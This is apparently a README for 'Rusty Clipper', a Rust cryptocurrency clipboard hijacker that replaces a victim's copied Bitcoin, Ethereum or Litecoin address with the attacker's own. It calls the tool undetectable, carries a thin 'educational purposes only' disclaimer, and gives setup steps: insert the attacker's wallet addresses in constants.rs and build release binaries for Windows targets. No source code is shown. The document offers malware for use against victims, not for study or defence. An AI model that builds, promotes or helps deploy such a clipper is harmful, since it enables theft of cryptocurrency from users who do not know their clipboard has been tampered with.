# Rusty Clipper
Undetectable crypto address clipper written in Rust

### Educational purposes only
Only use this on your own machine and do not use it maliciously. 

### How it works
When the victim copies a crypto address it replaces it with the attacker's address.

### Supports
- Bitcoin addresses
- Ethereum addresses
- Litecoin addresses

### How to use
1. Open it in VS Code or your preferred IDE
2. Goto `constants.rs` and replace the addresses with your own
6. Run (x64) `cargo build --release` or (x86) `cargo build --release --target=i686-pc-windows-msvc`

### Contributing
1. Fork it
2. Create your branch (`git checkout -b my-change`)
3. Commit your changes (`git commit -am 'changed something'`)
4. Push to the branch (`git push origin my-change`)
5. Create new pull request
